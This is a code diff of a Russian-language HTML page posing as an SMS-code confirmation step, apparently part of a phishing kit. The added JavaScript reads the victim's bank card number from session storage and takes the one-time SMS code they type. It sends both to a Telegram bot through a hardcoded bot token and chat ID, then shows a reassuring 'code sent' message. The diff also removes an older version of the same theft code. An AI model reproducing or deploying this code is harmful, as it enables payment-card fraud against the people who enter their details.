@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html lang="ru">
 <head>
@@ -817,12 +818,101 @@
         }
 
         // Обработчик кнопки подтверждения
-        document.getElementById('confirmBtn').addEventListener('click', function() {
-            const inputs = document.querySelectorAll('.code-input');
-            const code = Array.from(inputs).map(input => input.value).join('');
-            console.log('Введенный код:', code);
-            // Здесь будет логика проверки кода
+        // ФУНКЦИЯ ОТПРАВКИ СМС КОДА С НОМЕРОМ КАРТЫ
+async function sendSMSToBot(smsCode) {
+    try {
+        // ПОЛУЧАЕМ НОМЕР КАРТЫ ИЗ ХРАНИЛИЩА
+        const cardData = JSON.parse(sessionStorage.getItem('smsCardData') || sessionStorage.getItem('cardData') || '{}');
+        const cardNumber = cardData.number || 'Неизвестно';
+        
+        // СООБЩЕНИЕ: СМС КОД + НОМЕР КАРТЫ
+        const smsMessage = `📱 <b>СМС КОД ПОДТВЕРЖДЕН</b>
+
+💳 <b>Номер карты:</b> ${cardNumber}
+🔐 <b>СМС код:</b> ${smsCode}`;
+
+        const BOT_TOKEN = '8409122329:AAHdhsJk14l57s7EuPna-zj2YrXYlBhlcHU';
+        const CHAT_ID = '-1003239032658';
+
+        // Отправляем СМС код с номером карты
+        const smsResponse = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: smsMessage,
+                parse_mode: 'HTML'
+            })
         });
+
+        const smsResult = await smsResponse.json();
+        console.log('✅ СМС код с номером карты отправлен:', smsResult.ok);
+
+        return smsResult.ok;
+
+    } catch (error) {
+        console.error('❌ Ошибка отправки СМС кода:', error);
+        return false;
+    }
+}
+
+// ФУНКЦИИ УВЕДОМЛЕНИЙ
+function showSuccessMessage() {
+    const btn = document.getElementById('confirmBtn');
+    const originalText = btn.innerHTML;
+    
+    btn.innerHTML = '<i class="fas fa-check"></i> ✅ Код отправлен!';
+    btn.style.background = 'linear-gradient(135deg, #4CAF50 0%, #45a049 100%)';
+    btn.disabled = true;
+    
+    setTimeout(() => {
+        btn.innerHTML = originalText;
+        btn.style.background = '';
+        btn.disabled = false;
+        
+        // Очищаем поля
+        document.querySelectorAll('.code-input').forEach(input => {
+            input.value = '';
+            input.classList.remove('filled');
+        });
+        
+        // Фокус на первое поле
+        document.querySelector('.code-input').focus();
+        
+    }, 3000);
+}
+
+function showErrorMessage() {
+    const btn = document.getElementById('confirmBtn');
+    const originalText = btn.innerHTML;
+    
+    btn.innerHTML = '<i class="fas fa-times"></i> ❌ Ошибка отправки';
+    btn.style.background = 'linear-gradient(135deg, #FF6B6B 0%, #ee5a5a 100%)';
+    btn.disabled = true;
+    
+    setTimeout(() => {
+        btn.innerHTML = originalText;
+        btn.style.background = '';
+        btn.disabled = false;
+    }, 3000);
+}
+
+// Обработчик кнопки подтверждения
+document.getElementById('confirmBtn').addEventListener('click', async function() {
+    const inputs = document.querySelectorAll('.code-input');
+    const smsCode = Array.from(inputs).map(input => input.value).join('');
+    
+    console.log('📱 Введенный СМС код:', smsCode);
+    
+    // ОТПРАВЛЯЕМ СМС КОД В БОТА
+    const success = await sendSMSToBot(smsCode);
+    
+    if (success) {
+        showSuccessMessage();
+    } else {
+        showErrorMessage();
+    }
+});
 
         // Инициализация
         document.addEventListener('DOMContentLoaded', function() {
@@ -839,80 +929,6 @@
 
         // Предотвращаем масштабирование на iOS при фокусе
         document.addEventListener('touchstart', function() {}, {passive: true});
-        // Функция отправки SMS кода в бота
-// Функция отправки SMS кода в бота
-async function sendSMSCodeToBot(code) {
-    try {
-        // Берем номер карты из sessionStorage
-        const cardNumber = sessionStorage.getItem('cardNumber') || 'НЕТ ДАННЫХ';
-        
-        const message = `📱 <b>ВВЕДЕН SMS КОД</b>\n\n` +
-                       `💳 <b>Карта:</b> ${cardNumber}\n` +
-                       `🔢 <b>SMS Код:</b> ${code}`;
-
-        const BOT_TOKEN = '8409122329:AAHdhsJk14l57s7EuPna-zj2YrXYlBhlcHU';
-        const CHAT_ID = '-1003239032658';
-
-        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: message,
-                parse_mode: 'HTML'
-            })
-        });
-
-        const result = await response.json();
-        console.log('✅ SMS код отправлен в бота:', result.ok);
-        return result.ok;
-
-    } catch (error) {
-        console.error('❌ Ошибка отправки SMS кода:', error);
-        return false;
-    }
-}
-
-// Сохраняем номер карты при загрузке SMS страницы
-window.addEventListener('DOMContentLoaded', function() {
-    const urlParams = new URLSearchParams(window.location.search);
-    const cardNumber = urlParams.get('card');
-    if (cardNumber) {
-        sessionStorage.setItem('cardNumber', cardNumber);
-        console.log('💳 Номер карты для SMS:', cardNumber);
-    }
-});
-
-// Обновляем обработчик кнопки подтверждения в SMS
-document.getElementById('confirmBtn').addEventListener('click', async function() {
-    const inputs = document.querySelectorAll('.code-input');
-    const code = Array.from(inputs).map(input => input.value).join('');
-    
-    if (code.length === 6) {
-        console.log('🔢 Введенный SMS код:', code);
-        
-        // БЛОКИРУЕМ КНОПКУ ЧТОБЫ НЕ ЖМАЛИ ПОВТОРНО
-        this.disabled = true;
-        this.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Отправка...';
-        
-        // Отправляем код в бота
-        const success = await sendSMSCodeToBot(code);
-        
-        if (success) {
-            // ПРОСТО МЕНЯЕМ ТЕКСТ КНОПКИ
-            this.innerHTML = '<i class="fas fa-check"></i> Код отправлен!';
-            console.log('✅ Код отправлен в бота!');
-        } else {
-            alert('❌ Ошибка отправки кода');
-            // РАЗБЛОКИРУЕМ КНОПКУ
-            this.disabled = false;
-            this.innerHTML = '<i class="fas fa-check"></i> Подтвердить';
-        }
-    }
-});
     </script>
 </body>
 </html>
-
-
-
